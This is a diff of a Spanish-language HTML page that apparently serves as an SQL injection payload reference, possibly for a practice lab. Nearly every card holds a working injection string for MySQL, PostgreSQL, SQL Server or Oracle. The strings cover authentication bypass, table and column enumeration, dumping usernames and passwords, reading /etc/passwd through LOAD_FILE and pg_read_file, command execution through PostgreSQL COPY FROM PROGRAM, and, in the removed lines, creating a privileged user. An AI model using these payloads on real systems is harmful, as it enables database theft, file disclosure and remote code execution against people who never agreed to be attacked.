@@ -27,22 +27,22 @@
                         <div class="col-md-6">
                             <div class="card border-primary">
                                 <div class="card-header bg-primary text-white">
-                                    <h6 class="mb-0">Bypass de Autenticación</h6>
+                                    <h6 class="mb-0">Información del Sistema</h6>
                                 </div>
                                 <div class="card-body">
-                                    <code>admin' OR '1'='1' --</code>
-                                    <br><small class="text-muted">Bypass de login</small>
+                                    <code>' UNION SELECT 1,@@version,DATABASE(),USER(),NOW() --</code>
+                                    <br><small class="text-muted">Obtener información del servidor</small>
                                 </div>
                             </div>
                         </div>
                         <div class="col-md-6">
                             <div class="card border-danger">
                                 <div class="card-header bg-danger text-white">
-                                    <h6 class="mb-0">Union Attack</h6>
+                                    <h6 class="mb-0">Enumeración de Tablas</h6>
                                 </div>
                                 <div class="card-body">
-                                    <code>' UNION SELECT 1,2,3,4,5 --</code>
-                                    <br><small class="text-muted">Extraer datos</small>
+                                    <code>' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,'mysql_tables',NOW() FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() --</code>
+                                    <br><small class="text-muted">Listar tablas de la BD</small>
                                 </div>
                             </div>
                         </div>
@@ -51,22 +51,36 @@
                         <div class="col-md-6">
                             <div class="card border-warning">
                                 <div class="card-header bg-warning text-dark">
-                                    <h6 class="mb-0">Error Based</h6>
+                                    <h6 class="mb-0">Enumeración de Columnas</h6>
                                 </div>
                                 <div class="card-body">
-                                    <code>' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --</code>
-                                    <br><small class="text-muted">Extraer información del sistema</small>
+                                    <code>' UNION SELECT 1,COLUMN_NAME,DATA_TYPE,'users_columns',NOW() FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' --</code>
+                                    <br><small class="text-muted">Estructura de tabla users</small>
                                 </div>
                             </div>
                         </div>
                         <div class="col-md-6">
                             <div class="card border-info">
                                 <div class="card-header bg-info text-white">
-                                    <h6 class="mb-0">Time Based</h6>
+                                    <h6 class="mb-0">Extracción de Datos</h6>
                                 </div>
                                 <div class="card-body">
-                                    <code>' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --</code>
-                                    <br><small class="text-muted">Detección ciega</small>
+                                    <code>' UNION SELECT id,username,password,email,created_at FROM users --</code>
+                                    <br><small class="text-muted">Obtener datos de usuarios</small>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                    <div class="row mt-2">
+                        <div class="col-md-12">
+                            <div class="card border-warning">
+                                <div class="card-header bg-warning text-dark">
+                                    <h6 class="mb-0">📁 Lectura de Archivos del Sistema - LOAD_FILE()</h6>
+                                </div>
+                                <div class="card-body">
+                                    <code>' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5 --</code>
+                                    <br><small class="text-muted"><strong>🔒 CRÍTICO:</strong> Lee archivos del sistema sin restricciones de casting.</small>
                                 </div>
                             </div>
                         </div>
@@ -82,22 +96,22 @@
                         <div class="col-md-6">
                             <div class="card border-success">
                                 <div class="card-header bg-success text-white">
-                                    <h6 class="mb-0">Bypass de Autenticación</h6>
+                                    <h6 class="mb-0">Información del Sistema</h6>
                                 </div>
                                 <div class="card-body">
-                                    <code>admin' OR '1'='1' --</code>
-                                    <br><small class="text-muted">Bypass de login</small>
+                                    <code>' UNION SELECT 1,version(),'postgresql',current_user,NOW() --</code>
+                                    <br><small class="text-muted">Información del servidor PostgreSQL</small>
                                 </div>
                             </div>
                         </div>
                         <div class="col-md-6">
                             <div class="card border-danger">
                                 <div class="card-header bg-danger text-white">
-                                    <h6 class="mb-0">Union Attack</h6>
+                                    <h6 class="mb-0">Enumeración de Tablas (Stacked)</h6>
                                 </div>
                                 <div class="card-body">
-                                    <code>' UNION SELECT 1,2,3,4,5 --</code>
-                                    <br><small class="text-muted">Extraer datos</small>
+                                    <code>'; DROP TABLE IF EXISTS temp_tables; CREATE TABLE temp_tables AS SELECT tablename FROM pg_tables WHERE schemaname='public'; --</code>
+                                    <br><small class="text-muted">Crear tabla temporal con metadatos</small>
                                 </div>
                             </div>
                         </div>
@@ -106,22 +120,49 @@
                         <div class="col-md-6">
                             <div class="card border-warning">
                                 <div class="card-header bg-warning text-dark">
-                                    <h6 class="mb-0">Error Based</h6>
+                                    <h6 class="mb-0">Consulta de Tablas Temporales</h6>
                                 </div>
                                 <div class="card-body">
-                                    <code>' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT version()),0x7e,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a) --</code>
-                                    <br><small class="text-muted">Extraer información del sistema</small>
+                                    <code>' UNION SELECT 1,tablename,'public','pg_tables',NOW()::text FROM temp_tables --</code>
+                                    <br><small class="text-muted">Acceder a tabla temporal</small>
                                 </div>
                             </div>
                         </div>
                         <div class="col-md-6">
                             <div class="card border-info">
                                 <div class="card-header bg-info text-white">
-                                    <h6 class="mb-0">Time Based</h6>
+                                    <h6 class="mb-0">Enumeración de Columnas</h6>
                                 </div>
                                 <div class="card-body">
-                                    <code>' AND (SELECT pg_sleep(5)) --</code>
-                                    <br><small class="text-muted">Detección ciega</small>
+                                    <code>' UNION SELECT 999,column_name,data_type,'users_cols',CURRENT_TIMESTAMP FROM information_schema.columns WHERE table_name='users' --</code>
+                                    <br><small class="text-muted">Estructura de columnas</small>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="row mt-2">
+                        <div class="col-md-12">
+                            <div class="card border-danger">
+                                <div class="card-header bg-danger text-white">
+                                    <h6 class="mb-0">🚨 Remote Code Execution (RCE) - COPY FROM PROGRAM</h6>
+                                </div>
+                                <div class="card-body">
+                                    <code>'; DROP TABLE IF EXISTS temp_whoami; CREATE TEMP TABLE temp_whoami (content TEXT); COPY temp_whoami FROM PROGRAM 'whoami'; SELECT * FROM temp_whoami; --</code>
+                                    <br><small class="text-muted"><strong>⚠️ PELIGROSO:</strong> Ejecuta comandos del sistema operativo. Resultado: <strong>postgres</strong></small>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                    <div class="row mt-2">
+                        <div class="col-md-12">
+                            <div class="card border-warning">
+                                <div class="card-header bg-warning text-dark">
+                                    <h6 class="mb-0">📁 Lectura de Archivos del Sistema - pg_read_file()</h6>
+                                </div>
+                                <div class="card-body">
+                                    <code>' UNION SELECT '999',pg_read_file('/etc/passwd'),'test','test','2025-01-01 00:00:00'::timestamp --</code>
+                                    <br><small class="text-muted"><strong>🔒 CRÍTICO:</strong> Lee archivos del sistema. Requiere casting explícito de tipos.</small>
                                 </div>
                             </div>
                         </div>
@@ -137,22 +178,22 @@
                         <div class="col-md-6">
                             <div class="card border-warning">
                                 <div class="card-header bg-warning text-dark">
-                                    <h6 class="mb-0">Bypass de Autenticación</h6>
+                                    <h6 class="mb-0">Información del Sistema</h6>
                                 </div>
                                 <div class="card-body">
-                                    <code>admin' OR '1'='1' --</code>
-                                    <br><small class="text-muted">Bypass de login</small>
+                                    <code>' UNION SELECT 1,@@VERSION,DB_NAME(),SYSTEM_USER,GETDATE() --</code>
+                                    <br><small class="text-muted">Información del servidor SQL Server</small>
                                 </div>
                             </div>
                         </div>
                         <div class="col-md-6">
                             <div class="card border-danger">
                                 <div class="card-header bg-danger text-white">
-                                    <h6 class="mb-0">Union Attack</h6>
+                                    <h6 class="mb-0">Enumeración de Tablas</h6>
                                 </div>
                                 <div class="card-body">
-                                    <code>' UNION SELECT 1,2,3,4,5 --</code>
-                                    <br><small class="text-muted">Extraer datos</small>
+                                    <code>' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,'sqlserver_tables',GETDATE() FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE' --</code>
+                                    <br><small class="text-muted">Listar tablas base</small>
                                 </div>
                             </div>
                         </div>
@@ -161,22 +202,22 @@
                         <div class="col-md-6">
                             <div class="card border-warning">
                                 <div class="card-header bg-warning text-dark">
-                                    <h6 class="mb-0">Error Based</h6>
+                                    <h6 class="mb-0">Enumeración de Columnas</h6>
                                 </div>
                                 <div class="card-body">
-                                    <code>' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT @@version),0x7e,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a) --</code>
-                                    <br><small class="text-muted">Extraer información del sistema</small>
+                                    <code>' UNION SELECT 1,COLUMN_NAME,DATA_TYPE,'users_columns',GETDATE() FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' --</code>
+                                    <br><small class="text-muted">Estructura de columnas</small>
                                 </div>
                             </div>
                         </div>
                         <div class="col-md-6">
                             <div class="card border-info">
                                 <div class="card-header bg-info text-white">
-                                    <h6 class="mb-0">Time Based</h6>
+                                    <h6 class="mb-0">Extracción de Datos</h6>
                                 </div>
                                 <div class="card-body">
-                                    <code>' WAITFOR DELAY '00:00:05' --</code>
-                                    <br><small class="text-muted">Detección ciega</small>
+                                    <code>' UNION SELECT id,username,password,email,created_at FROM users --</code>
+                                    <br><small class="text-muted">Datos de usuarios</small>
                                 </div>
                             </div>
                         </div>
@@ -192,22 +233,22 @@
                         <div class="col-md-6">
                             <div class="card border-danger">
                                 <div class="card-header bg-danger text-white">
-                                    <h6 class="mb-0">Bypass de Autenticación</h6>
+                                    <h6 class="mb-0">Información del Sistema</h6>
                                 </div>
                                 <div class="card-body">
-                                    <code>admin' OR '1'='1' --</code>
-                                    <br><small class="text-muted">Bypass de login</small>
+                                    <code>' UNION SELECT 999,USER,'oracle_system','discovery',SYSDATE FROM DUAL --</code>
+                                    <br><small class="text-muted">Usuario actual del sistema</small>
                                 </div>
                             </div>
                         </div>
                         <div class="col-md-6">
                             <div class="card border-danger">
                                 <div class="card-header bg-danger text-white">
-                                    <h6 class="mb-0">Union Attack</h6>
+                                    <h6 class="mb-0">Enumeración de Tablas</h6>
                                 </div>
                                 <div class="card-body">
-                                    <code>' UNION SELECT 1,2,3,4,5 FROM DUAL --</code>
-                                    <br><small class="text-muted">Extraer datos</small>
+                                    <code>' UNION SELECT 999,TABLE_NAME,'USER_TABLES','oracle_enum',SYSDATE FROM USER_TABLES --</code>
+                                    <br><small class="text-muted">Tablas del usuario</small>
                                 </div>
                             </div>
                         </div>
@@ -216,53 +257,53 @@
                         <div class="col-md-6">
                             <div class="card border-warning">
                                 <div class="card-header bg-warning text-dark">
-                                    <h6 class="mb-0">Error Based</h6>
+                                    <h6 class="mb-0">Enumeración de Sinónimos</h6>
                                 </div>
                                 <div class="card-body">
-                                    <code>' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT banner FROM v$version WHERE rownum=1),0x7e,FLOOR(DBMS_RANDOM.VALUE(0,2)))x FROM dual GROUP BY x)a) --</code>
-                                    <br><small class="text-muted">Extraer información del sistema</small>
+                                    <code>' UNION SELECT 999,SYNONYM_NAME,TABLE_NAME,'oracle_synonyms',SYSDATE FROM USER_SYNONYMS --</code>
+                                    <br><small class="text-muted">Mapeo de sinónimos a tablas</small>
                                 </div>
                             </div>
                         </div>
                         <div class="col-md-6">
                             <div class="card border-info">
                                 <div class="card-header bg-info text-white">
-                                    <h6 class="mb-0">Time Based</h6>
+                                    <h6 class="mb-0">Enumeración de Columnas</h6>
                                 </div>
                                 <div class="card-body">
-                                    <code>' AND (SELECT UTL_INADDR.GET_HOST_NAME('localhost') FROM DUAL WHERE ROWNUM=1) IS NOT NULL --</code>
-                                    <br><small class="text-muted">Detección ciega</small>
+                                    <code>' UNION SELECT 999,COLUMN_NAME,DATA_TYPE,'sys_products_cols',SYSDATE FROM ALL_TAB_COLUMNS WHERE OWNER='SYS' AND TABLE_NAME='PRODUCTS' --</code>
+                                    <br><small class="text-muted">Columnas de tablas del sistema</small>
                                 </div>
                             </div>
                         </div>
                     </div>
                 </div>
 
-                <!-- Advanced Examples -->
+                <!-- Payloads de Referencia Rápida -->
                 <div class="mb-4">
                     <h4 class="text-dark">
-                        <i class="fas fa-rocket"></i> Ejemplos Avanzados
+                        <i class="fas fa-rocket"></i> Payloads de Referencia Rápida
                     </h4>
                     <div class="row">
                         <div class="col-md-6">
                             <div class="card border-dark">
                                 <div class="card-header bg-dark text-white">
-                                    <h6 class="mb-0">Dump de Tablas</h6>
+                                    <h6 class="mb-0">Información del Sistema (Multi-DB)</h6>
                                 </div>
                                 <div class="card-body">
-                                    <code>' UNION SELECT table_name,NULL,NULL,NULL,NULL FROM information_schema.tables --</code>
-                                    <br><small class="text-muted">Listar todas las tablas</small>
+                                    <code>-- MySQL/SQL Server<br>' UNION SELECT 1,@@version,DATABASE(),USER(),NOW() --<br><br>-- PostgreSQL<br>' UNION SELECT 1,version(),'postgresql',current_user,NOW() --<br><br>-- Oracle<br>' UNION SELECT 999,USER,'oracle',USER,SYSDATE FROM DUAL --</code>
+                                    <br><small class="text-muted">Adaptado según el motor de BD</small>
                                 </div>
                             </div>
                         </div>
                         <div class="col-md-6">
                             <div class="card border-dark">
                                 <div class="card-header bg-dark text-white">
-                                    <h6 class="mb-0">Dump de Columnas</h6>
+                                    <h6 class="mb-0">Enumeración de Tablas</h6>
                                 </div>
                                 <div class="card-body">
-                                    <code>' UNION SELECT column_name,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users' --</code>
-                                    <br><small class="text-muted">Listar columnas de una tabla</small>
+                                    <code>-- MySQL/SQL Server<br>' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,'enum',NOW() FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() --<br><br>-- PostgreSQL (Stacked)<br>'; CREATE TABLE temp_enum AS SELECT tablename FROM pg_tables WHERE schemaname='public'; --<br><br>-- Oracle (Sinónimos)<br>' UNION SELECT 999,SYNONYM_NAME,TABLE_NAME,'synonyms',SYSDATE FROM USER_SYNONYMS --</code>
+                                    <br><small class="text-muted">Técnicas específicas por motor</small>
                                 </div>
                             </div>
                         </div>
@@ -271,22 +312,22 @@
                         <div class="col-md-6">
                             <div class="card border-dark">
                                 <div class="card-header bg-dark text-white">
-                                    <h6 class="mb-0">Dump de Datos</h6>
+                                    <h6 class="mb-0">Enumeración de Columnas</h6>
                                 </div>
                                 <div class="card-body">
-                                    <code>' UNION SELECT username,password,email,NULL,NULL FROM users --</code>
-                                    <br><small class="text-muted">Extraer datos de usuarios</small>
+                                    <code>-- MySQL/SQL Server<br>' UNION SELECT 1,COLUMN_NAME,DATA_TYPE,'columns',NOW() FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='tabla' --<br><br>-- PostgreSQL<br>' UNION SELECT 999,column_name,data_type,'columns',CURRENT_TIMESTAMP FROM information_schema.columns WHERE table_name='tabla' --<br><br>-- Oracle<br>' UNION SELECT 999,COLUMN_NAME,DATA_TYPE,'columns',SYSDATE FROM ALL_TAB_COLUMNS WHERE OWNER='ESQUEMA' AND TABLE_NAME='TABLA' --</code>
+                                    <br><small class="text-muted">Mapeo de estructura de tablas</small>
                                 </div>
                             </div>
                         </div>
                         <div class="col-md-6">
                             <div class="card border-dark">
                                 <div class="card-header bg-dark text-white">
-                                    <h6 class="mb-0">Escalación de Privilegios</h6>
+                                    <h6 class="mb-0">Consideraciones Especiales</h6>
                                 </div>
                                 <div class="card-body">
-                                    <code>'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%' IDENTIFIED BY 'password'; --</code>
-                                    <br><small class="text-muted">Crear usuario con privilegios</small>
+                                    <code>-- Oracle: Estrictez de tipos crítica<br>-- PostgreSQL: Casting explícito (::text)<br>-- Oracle: Sinónimos ocultan ubicación real<br>-- PostgreSQL: Stacked queries habilitadas<br>-- General: Validar número de columnas primero</code>
+                                    <br><small class="text-muted">Notas importantes por motor</small>
                                 </div>
                             </div>
                         </div>
